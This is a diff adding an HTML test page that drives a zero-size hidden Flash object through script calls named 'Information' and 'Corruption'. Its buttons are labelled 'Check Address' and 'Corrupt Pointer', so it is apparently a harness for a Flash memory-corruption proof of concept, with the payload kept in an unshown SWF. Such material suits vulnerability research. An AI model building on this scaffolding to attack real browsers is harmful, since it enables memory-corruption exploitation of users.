@@ -1,0 +1,33 @@
+<html>
+<body>
+<script>
+function check(buff)
+{
+	alert("recieved :"+buff);
+}
+function _Information() 
+{
+	var a=document.getElementById("address").value;
+	if(parseInt(a)%4!=0 || a==null)
+		return alert("invalid value for a");
+	if(a.indexOf("0x")==-1)
+		document.getElementById("flashtest").Information("0x"+a);
+	else
+		document.getElementById("flashtest").Information(a);
+}
+function _Corruption() 
+{
+	document.getElementById("flashtest").Corruption();
+}
+</script>
+<object id="flashtest" type="application/x-shockwave-flash" data="test.swf" width=0 height=0/>
+<param name="bgcolor" value="#777777"/>
+<param name="allowScriptAccess" value="always"/>
+</object>
+<form>
+	<input id="address" type="text"/>
+    <input type="button" onclick="_Information()" value="Check Address"/><br><br>
+	<input type="button" onclick="_Corruption()" value="Corrupt Pointer"/>
+</form>
+</body>
+</html>
